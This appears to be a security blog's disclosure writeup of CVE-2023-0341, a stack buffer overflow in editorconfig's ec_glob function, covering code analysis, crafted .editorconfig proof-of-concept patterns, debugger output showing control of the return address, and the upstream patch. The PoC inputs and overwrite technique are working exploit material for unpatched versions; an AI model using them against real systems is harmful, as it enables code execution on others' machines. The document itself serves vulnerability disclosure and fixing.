<!DOCTYPE html>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
<html lang="en"><head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  

  <title>
    
      CVE-2023-0341
    
  </title>

  <!-- Begin Jekyll SEO tag v2.6.1 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="CVE-2023-0341" />
<meta name="author" content="David Fernandez" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Litios blog" />
<meta property="og:description" content="Litios blog" />
<link rel="canonical" href="http://0.0.0.0:4000/2023/01/14/CVE-2023-0341.html" />
<meta property="og:url" content="http://0.0.0.0:4000/2023/01/14/CVE-2023-0341.html" />
<meta property="og:site_name" content="Litios Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-01-14T00:00:00+01:00" />
<script type="application/ld+json">
{"headline":"CVE-2023-0341","url":"http://0.0.0.0:4000/2023/01/14/CVE-2023-0341.html","datePublished":"2023-01-14T00:00:00+01:00","dateModified":"2023-01-14T00:00:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/2023/01/14/CVE-2023-0341.html"},"author":{"@type":"Person","name":"David Fernandez"},"@type":"BlogPosting","description":"Litios blog","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

  <link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/feed.xml" title="Litios Blog" />

  <link rel="shortcut icon" type="image/x-icon" href="/./logo.ico" />
  <link rel="stylesheet" href="http://0.0.0.0:4000/assets/css/main.css" />
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons"
      rel="stylesheet">
</head>
<body a="light" style="color: #f2f2f2">
    <main class="page-content" aria-label="Content">
        <div class="w">
            <div style="display: flex; justify-content: space-between;">
<a style="font-size: 2em;" href="http://0.0.0.0:4000">..</a>
<span onClick="if (document.body.style.color != 'rgb(242, 242, 242)'){
document.body.style.color = '#f2f2f2'; document.body.style.backgroundColor = '#202324';
} else {
document.body.style.color = 'black'; document.body.style.backgroundColor = 'white';
}
" class="material-icons" style="
    cursor: pointer;
    display:flex;
    flex-direction:column;
    justify-content:end;
    align-items:center;
">visibility</span>
</div>
<br><br><br>
<pre style="font-size: 0.5vw; text-align: center">

________/\\\\\\\\\__/\\\________/\\\__/\\\\\\\\\\\\\\\__________________/\\\\\\\\\_________/\\\\\\\_______/\\\\\\\\\_________/\\\\\\\\\\____________________/\\\\\\\________/\\\\\\\\\\_____________/\\\_________/\\\_        
 _____/\\\////////__\/\\\_______\/\\\_\/\\\///////////_________________/\\\///////\\\_____/\\\/////\\\___/\\\///////\\\_____/\\\///////\\\_________________/\\\/////\\\____/\\\///////\\\__________/\\\\\_____/\\\\\\\_       
  ___/\\\/___________\//\\\______/\\\__\/\\\___________________________\///______\//\\\___/\\\____\//\\\_\///______\//\\\___\///______/\\\_________________/\\\____\//\\\__\///______/\\\_________/\\\/\\\____\/////\\\_      
   __/\\\______________\//\\\____/\\\___\/\\\\\\\\\\\______/\\\\\\\\\\\___________/\\\/___\/\\\_____\/\\\___________/\\\/___________/\\\//____/\\\\\\\\\\\_\/\\\_____\/\\\_________/\\\//________/\\\/\/\\\________\/\\\_     
    _\/\\\_______________\//\\\__/\\\____\/\\\///////______\///////////_________/\\\//_____\/\\\_____\/\\\________/\\\//____________\////\\\__\///////////__\/\\\_____\/\\\________\////\\\_____/\\\/__\/\\\________\/\\\_    
     _\//\\\_______________\//\\\/\\\_____\/\\\_______________________________/\\\//________\/\\\_____\/\\\_____/\\\//__________________\//\\\_______________\/\\\_____\/\\\___________\//\\\__/\\\\\\\\\\\\\\\\_____\/\\\_   
      __\///\\\______________\//\\\\\______\/\\\_____________________________/\\\/___________\//\\\____/\\\____/\\\/____________/\\\______/\\\________________\//\\\____/\\\___/\\\______/\\\__\///////////\\\//______\/\\\_  
       ____\////\\\\\\\\\______\//\\\_______\/\\\\\\\\\\\\\\\________________/\\\\\\\\\\\\\\\__\///\\\\\\\/____/\\\\\\\\\\\\\\\_\///\\\\\\\\\/__________________\///\\\\\\\/___\///\\\\\\\\\/_____________\/\\\________\/\\\_ 
        _______\/////////________\///________\///////////////________________\///////////////_____\///////_____\///////////////____\/////////______________________\///////_______\/////////_______________\///_________\///_ 
</pre>

<hr />

<p>This post is a writeup about CVE-2023-0341: how it was discovered, analysis and the proposed patch.</p>

<blockquote>
  <p>Special thanks to the whole Ubuntu Security team and, in particular, to Mark Esler and Seth Arnold.</p>
</blockquote>

<hr />

<h2 id="description">Description</h2>

<p>There is a buffer overflow vulnerability in the <code class="language-plaintext highlighter-rouge">ec_glob</code> function, allowing an attacker to perform an arbitrary write to the stack and possibly allowing remote code execution.</p>

<h2 id="finding-the-crash">Finding the crash</h2>

<p>In Ubuntu, <a href="https://github.com/canonical/ubuntu-mir">MIRs</a> are performed before moving a package to main. This analysis allows us to understand the package before fully maintaining and supporting it.</p>

<p>During the Security analysis of the MIR for editorconfig, Seth Arnold was worried about how the input was being handled in <code class="language-plaintext highlighter-rouge">ec_glob</code>. Mark Esler, who was the main responsible for this MIR, performed an excellent job when fuzzing the <code class="language-plaintext highlighter-rouge">ec_glob</code>, finding several crashes around that function.</p>

<p>From there, I began to analyze the crash and the code and develop a PoC.</p>

<h2 id="analyzing-the-code">Analyzing the code</h2>

<p>The function ec_glob takes a pattern and a string and checks if the string fulfills the pattern. The vulnerability occurs due to how the pattern is processed and written in p_pcre.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="cp">#define PATTERN_MAX  4097
</span>

 <span class="kt">int</span> <span class="nf">ec_glob</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pattern</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">){</span>
   <span class="kt">char</span> <span class="o">*</span>                    <span class="n">c</span><span class="p">;</span>
   <span class="kt">char</span>                      <span class="n">pcre_str</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">PATTERN_MAX</span><span class="p">]</span> <span class="o">=</span> <span class="s">"^"</span><span class="p">;</span>
   <span class="kt">char</span>                      <span class="n">l_pattern</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">PATTERN_MAX</span><span class="p">];</span>
   <span class="kt">int</span>                       <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>


   <span class="n">strcpy</span><span class="p">(</span><span class="n">l_pattern</span><span class="p">,</span> <span class="n">pattern</span><span class="p">);</span>
   <span class="n">p_pcre</span> <span class="o">=</span> <span class="n">pcre_str</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
   <span class="n">pcre_str_end</span> <span class="o">=</span> <span class="n">pcre_str</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">PATTERN_MAX</span><span class="p">;</span>
</code></pre></div></div>

<p>The overflow occurs in:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="p">(</span><span class="n">c</span> <span class="o">=</span> <span class="n">l_pattern</span><span class="p">;</span> <span class="o">*</span><span class="n">c</span><span class="p">;</span> <span class="o">++</span> <span class="n">c</span><span class="p">)</span>
</code></pre></div></div>

<p>During this for, several characters are read from l_pattern (c, from now on), processed and written to p_pcre. In most cases, this is performed by:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define STRING_CAT(p, string, end)  do {    \
   size_t string_len = strlen(string); \
   if (p + string_len &gt;= end) \
       return -1; \
   strcat(p, string); \
   p += string_len; \
} while(0)
</span></code></pre></div></div>

<p>There is a bound check which always uses <code class="language-plaintext highlighter-rouge">pcre_str_end</code>. And that should be safe as the amount of data we can provide is limited.</p>

<p>But we can quickly fill the buffer with how the <code class="language-plaintext highlighter-rouge">?</code> is processed:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">case</span> <span class="sc">'?'</span><span class="p">:</span>
    <span class="n">STRING_CAT</span><span class="p">(</span><span class="n">p_pcre</span><span class="p">,</span> <span class="s">"[^/]"</span><span class="p">,</span> <span class="n">pcre_str_end</span><span class="p">);</span>
    <span class="k">break</span><span class="p">;</span>
</code></pre></div></div>

<p>For every <code class="language-plaintext highlighter-rouge">?</code> we provide, 4 characters will be written into <code class="language-plaintext highlighter-rouge">p_pcre</code>. That will only allow us to quickly fill the <code class="language-plaintext highlighter-rouge">p_pcre</code> buffer as there is a bound check in <code class="language-plaintext highlighter-rouge">STRING_CAT</code>.</p>

<p>After that, we can use the default option to overflow into the c buffer:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">default:</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">isalnum</span><span class="p">(</span><span class="o">*</span><span class="n">c</span><span class="p">))</span>
        <span class="o">*</span><span class="p">(</span><span class="n">p_pcre</span> <span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="sc">'\\'</span><span class="p">;</span>


    <span class="o">*</span><span class="p">(</span><span class="n">p_pcre</span> <span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="n">c</span><span class="p">;</span>
</code></pre></div></div>

<p>By not using an alphanumeric character, we will write 2 characters for each input character. No bounding check so we can easily overflow the buffer.</p>

<p>Then, we will use <code class="language-plaintext highlighter-rouge">[</code> for the final part. This is what will allow us to write big amounts of data to the stack to finally reach the end of it and overflow the canary, stack pointer, return pointer and beyond.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">case</span> <span class="sc">'['</span><span class="p">:</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">is_in_bracket</span><span class="p">)</span><span class="cm">/* inside brackets, we really mean bracket */</span>
    <span class="p">{</span>
        <span class="n">STRING_CAT</span><span class="p">(</span><span class="n">p_pcre</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">["</span><span class="p">,</span> <span class="n">pcre_str_end</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>


    <span class="p">{</span>
        <span class="cm">/* check whether we have slash within the bracket */</span>
        <span class="kt">_Bool</span>           <span class="n">has_slash</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="kt">char</span> <span class="o">*</span>          <span class="n">cc</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="n">cc</span> <span class="o">=</span> <span class="n">c</span><span class="p">;</span> <span class="o">*</span><span class="n">cc</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">cc</span> <span class="o">!=</span> <span class="sc">']'</span><span class="p">;</span> <span class="o">++</span> <span class="n">cc</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">cc</span> <span class="o">==</span> <span class="sc">'\\'</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">(</span><span class="n">cc</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="sc">'\0'</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="o">++</span> <span class="n">cc</span><span class="p">;</span>
                <span class="k">continue</span><span class="p">;</span>
            <span class="p">}</span>


            <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">cc</span> <span class="o">==</span> <span class="sc">'/'</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">has_slash</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>


        <span class="cm">/* if we have slash in the brackets, just do it literally */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">has_slash</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="kt">char</span> <span class="o">*</span>           <span class="n">right_bracket</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="sc">']'</span><span class="p">);</span>


            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">right_bracket</span><span class="p">)</span><span class="cm">/* The right bracket may not exist*/</span> 
                <span class="n">right_bracket</span> <span class="o">=</span> <span class="n">c</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>


            <span class="n">strcat</span><span class="p">(</span><span class="n">p_pcre</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">);</span>
            <span class="n">strncat</span><span class="p">(</span><span class="n">p_pcre</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">right_bracket</span> <span class="o">-</span> <span class="n">c</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">right_bracket</span><span class="p">)</span>  <span class="cm">/* right_bracket is a bracket */</span>
                <span class="n">strcat</span><span class="p">(</span><span class="n">p_pcre</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">]"</span><span class="p">);</span>
            <span class="n">p_pcre</span> <span class="o">+=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">p_pcre</span><span class="p">);</span>
            <span class="n">c</span> <span class="o">=</span> <span class="n">right_bracket</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!*</span><span class="n">c</span><span class="p">)</span>
                <span class="cm">/* end of string, meaning that right_bracket is not a
                * bracket. Then we go back one character to make the
                * parsing end normally for the counter in the "for"
                * loop. */</span>
                <span class="n">c</span> <span class="o">-=</span> <span class="mi">1</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>In the most simple way, this part looks for a <code class="language-plaintext highlighter-rouge">/</code>. It will copy from <code class="language-plaintext highlighter-rouge">[</code> to <code class="language-plaintext highlighter-rouge">]</code> to <code class="language-plaintext highlighter-rouge">p_pcre</code> if found, or all the remaining characters of <code class="language-plaintext highlighter-rouge">c</code> if not found. After that, it will update <code class="language-plaintext highlighter-rouge">p_pcre</code> and <code class="language-plaintext highlighter-rouge">c</code> to the corresponding amount of copied data.</p>

<p>We already overflowed into <code class="language-plaintext highlighter-rouge">c</code>. As we didn’t provide a final <code class="language-plaintext highlighter-rouge">]</code>, it will copy all <code class="language-plaintext highlighter-rouge">c</code>, also adding a <code class="language-plaintext highlighter-rouge">]</code> to <code class="language-plaintext highlighter-rouge">p_pcre</code> at the end, useful for the following part. That means that <code class="language-plaintext highlighter-rouge">strlen(p_pcre)</code> will take from <code class="language-plaintext highlighter-rouge">p_pcre</code> to the end of <code class="language-plaintext highlighter-rouge">c</code>, but <code class="language-plaintext highlighter-rouge">c</code> will be updated only to the right part previously calculated. <code class="language-plaintext highlighter-rouge">Strncat</code> does not behave well when both pointers are writing one over the other:</p>

<blockquote>
  <p>As stayed by the <a href="https://linux.die.net/man/3/strncat">strcat documentation</a>: <em>The strings may not overlap</em></p>
</blockquote>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">test</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"AAAABBBBCCCCDDDDEEEE"</span><span class="p">;</span>
	<span class="kt">char</span> <span class="o">*</span><span class="n">test2</span> <span class="o">=</span> <span class="n">test</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
	<span class="n">strncat</span><span class="p">(</span><span class="n">test</span><span class="p">,</span> <span class="n">test2</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">test</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">test2</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./a.out                                                                                                                                                 
AAAABBBBCCCCDDDDEEEEAABBAABBBBCCCCDDDDEEEEAABB%    
</code></pre></div></div>

<p>This is what happens here, more data is written to the buffer than <code class="language-plaintext highlighter-rouge">right_bracket - c</code>.</p>

<p>After the second copy, <code class="language-plaintext highlighter-rouge">c</code> will always be the previous <code class="language-plaintext highlighter-rouge">p_pcre</code> pointer because the <code class="language-plaintext highlighter-rouge">right_bracket</code> will be where we added the <code class="language-plaintext highlighter-rouge">]</code> in the previous iteration. The pattern repeats as many <code class="language-plaintext highlighter-rouge">[</code> as specified, consuming one by iteration. This allows us to write a huge and controlled amount of data to the stack.</p>

<blockquote>
  <p>Note that the copy will fully depend on the memory state. We may face cases where other characters are copied that may interfere with the script, breaking the loop or returning a fault somewhere else (for example, another crash was detected in free due to overriding the pointer address with garbage)</p>
</blockquote>

<p>After a lot of iterations, we will process the final <code class="language-plaintext highlighter-rouge">/</code> if no other special char is found due to the memory state. That will trigger <code class="language-plaintext highlighter-rouge">STRING_CAT</code>, performing the bound checking, noticing that we overflowed and returning directly. This allows us to fully control the stack, even overriding other function stacks.</p>

<blockquote>
  <p>We can also stop execution anytime by triggering a copy with the macro that will detect the overflow and call return directly.</p>
</blockquote>

<h2 id="poc">PoC</h2>

<p>According to the analysis previously performed, we can create a simple PoC:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++  ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[[[[[[[[++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++/++++++++++++++++++++]
ene = lf
</code></pre></div></div>

<p>We can then run the PoC like:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>editorconfig /path/to/folder/.editorconfig
<span class="k">***</span> stack smashing detected <span class="k">***</span>: terminated
<span class="o">[</span>1]    36421 IOT instruction <span class="o">(</span>core dumped<span class="o">)</span>  editorconfig /path/to/folder/.editorconfig
</code></pre></div></div>

<p>After playing around with the offsets, I was able to get the desired values in the right places. Therefore, an attacker can control both the content and the address to write it:</p>

<blockquote>
  <p>I provided AAAAAAAA as the return address and BBBBBBBB as the new stack pointer</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  x/1i <span class="nv">$rip</span>
<span class="o">=&gt;</span> 0x7ffff7fb4fd5 &lt;ec_glob+3253&gt;:	ret    
gef➤  info r <span class="nv">$rsp</span> <span class="nv">$rbp</span>
rsp            0x7fffffffa1b8      
rbp            0x4242424242424242 
gef➤  x/2wx <span class="nv">$rsp</span>
0x7fffffffa1b8:	0x41414141	0x41414141
</code></pre></div></div>

<blockquote>
  <p>As explained in the analysis, the values should be after the <code class="language-plaintext highlighter-rouge">[[[[[[[[</code>.</p>
</blockquote>

<p>Original contents of the PoC to prove exploitability:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[[[|[[[?????????????????????????????????????????????=?????????????????????????????????????????????????????????????????????????\????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????�??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????.??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????%?????????????????????????????????????????????????????????????????????????????????]??????????????????????????????????????????????????????????????????????????????����������������������������������������������������������������������������������������������������������XXXXXXXXXXXX�����XX[[[[[[[[[[[[[[[[[[[[[n,.is*/XXXXBBBBBBBBAAAAAAAAXXXXAA[*]
ene\c = lf
</code></pre></div></div>

<h2 id="proposed-patch">Proposed patch</h2>

<p>The issue could be fixed by ensuring that all copied that does not overflow the buffer. For that, I provided the following patch:</p>

<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff --git a/src/lib/ec_glob.c b/src/lib/ec_glob.c
index 32b3941..ea62aee 100644
</span><span class="gd">--- a/src/lib/ec_glob.c
</span><span class="gi">+++ b/src/lib/ec_glob.c
</span><span class="p">@@ -57,6 +57,13 @@</span> static const UT_icd ut_int_pair_icd = {sizeof(int_pair),NULL,NULL,NULL};
     p += string_len; \
 } while(0)
 
<span class="gi">+/* safely add a char to a string then move the pointer to the end */
+#define ADD_CHAR(string, new_chr, end)  do {    \
+    if (string + 1 &gt;= end) \
+        return -1; \
+    *(string ++) = new_chr; \
+} while(0)
+
</span> #define PATTERN_MAX  4097
 /*
  * Whether the string matches the given glob pattern. Return 0 if successful, return -1 if a PCRE
<span class="p">@@ -131,8 +138,8 @@</span> int ec_glob(const char *pattern, const char *string)
         case '\\':      /* also skip the next one */
             if (*(c+1) != '\0')
             {
<span class="gd">-                *(p_pcre ++) = *(c++);
-                *(p_pcre ++) = *c;
</span><span class="gi">+                ADD_CHAR(p_pcre, *(c++), pcre_str_end);
+                ADD_CHAR(p_pcre, *c, pcre_str_end);
</span>             }
             else
                 STRING_CAT(p_pcre, "\\\\", pcre_str_end);
<span class="p">@@ -208,18 +215,18 @@</span> int ec_glob(const char *pattern, const char *string)
                 ++ c;
             }
             else
<span class="gd">-                *(p_pcre ++) = '[';
</span><span class="gi">+                STRING_CAT(p_pcre, "[", pcre_str_end);
</span> 
             break;
 
         case ']':
             is_in_bracket = 0;
<span class="gd">-            *(p_pcre ++) = *c;
</span><span class="gi">+            ADD_CHAR(p_pcre, *c, pcre_str_end);
</span>             break;
 
         case '-':
             if (is_in_bracket)      /* in brackets, - indicates range */
<span class="gd">-                *(p_pcre ++) = *c;
</span><span class="gi">+                ADD_CHAR(p_pcre, *c, pcre_str_end);
</span>             else
                 STRING_CAT(p_pcre, "\\-", pcre_str_end);
 
<span class="p">@@ -302,12 +309,12 @@</span> int ec_glob(const char *pattern, const char *string)
             }
 
             -- brace_level;
<span class="gd">-            *(p_pcre ++) = ')';
</span><span class="gi">+            STRING_CAT(p_pcre, ")", pcre_str_end);
</span>             break;
 
         case ',':
             if (brace_level &gt; 0)  /* , inside {...} */
<span class="gd">-                *(p_pcre ++) = '|';
</span><span class="gi">+                STRING_CAT(p_pcre, "|", pcre_str_end);
</span>             else
                 STRING_CAT(p_pcre, "\\,", pcre_str_end);
             break;
<span class="p">@@ -326,9 +333,9 @@</span> int ec_glob(const char *pattern, const char *string)
 
         default:
             if (!isalnum(*c))
<span class="gd">-                *(p_pcre ++) = '\\';
</span><span class="gi">+                STRING_CAT(p_pcre, "\\", pcre_str_end);
</span> 
<span class="gd">-            *(p_pcre ++) = *c;
</span><span class="gi">+            ADD_CHAR(p_pcre, *c, pcre_str_end);
</span>         }
     }
 
</code></pre></div></div>

<p>All tests passed and none of the previously discovered crashes worked anymore after the patch.</p>

<p>The patch landed upstream in commit <a href="https://github.com/editorconfig/editorconfig-core-c/commit/41281ea82fbf24b060a9f69b9c5369350fb0529e">41281ea82fbf24b060a9f69b9c5369350fb0529e</a>.</p>

<p><em>Many thanks to Hong Xu (xuhdev) for the quick response and handling of the issue.</em></p>


        </div>
    </main>

    
    </body>
</html>